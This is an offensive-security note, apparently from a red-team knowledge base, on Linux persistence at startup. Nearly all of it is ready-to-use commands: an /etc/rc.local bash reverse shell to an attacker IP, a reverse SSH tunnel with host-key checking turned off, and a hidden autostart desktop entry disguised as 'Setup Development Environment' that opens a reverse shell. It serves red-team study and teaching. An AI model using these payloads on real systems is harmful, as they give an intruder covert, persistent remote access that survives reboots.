---
author(s):
  - Userware
tags:
  - post-exploitation
  - maintaining-access
  - persistence
  - living-off-the-land
  - linux
---
# Startup

## 01 - Elevated

### 1.1 - Callback Shell

```
$ cat /etc/rc.local
#!/bin/sh -e
/bin/bash -i >& /dev/tcp/<IP>/<PORT> 0>&1
exit 0
```

### 1.2 - Reverse SSH Tunneling

Refer to this [[06 - Tactics & Techniques & Procedures (TTPs) Phases/F - Post Exploitation/0x08 - Maintaining Access/Persistence/Linux/Remote Login/SSH/Manual/Living off the Land|section]] for more context.

```
$ cat /etc/rc.local
#!/bin/sh -e
nohup ssh -i /tmp/keys/id_rsa -NTfCqR [127.0.0.1]:<SOCKS_Proxy> -o "UserKnownHostsFile=/dev/null StrictHostKeyChecking=no" <username>@<attacker_IP>
exit 0
```

## 02 - Userland Desktop Entries

```
$ touch /tmp/payload.desktop

$ desktop-file-install \
--dir=".config/autostart/" \
--set-name="Setup Development Environment" \
--set-key="Terminal" --set-value="false" \
--set-key="Exec" --set-value="/bin/bash -c \"/bin/bash -i >& /dev/tcp/<IP>/<PORT> 0>&1\"" \
--set-key="Type" --set-value="Application" \
--set-key="NoDisplay" --set-value="true" \
--remove-key="X-Desktop-File-Install-Version" \
payload.desktop 2&>1
```

Another way to do it.

```
$ cat > ~/.config/autostart/payload.desktop << EOF
[Desktop Entry]
Name=Setup Development Environment
Exec=/bin/bash -c "/bin/bash -i >& /dev/tcp/<IP>/<PORT> 0>&1"
Type=Application
EOF
```

---
## References

### Backlinks

- [[06 - Tactics & Techniques & Procedures (TTPs) Phases/F - Post Exploitation/0x08 - Maintaining Access/Malware Development/Helpers/Persistence/Linux/Autostart Locations]]

- [[Linux Post Exploitation Persistence References]]

- [[04 - Remote Port Forwarding|SSH: Remote Port Forwarding]]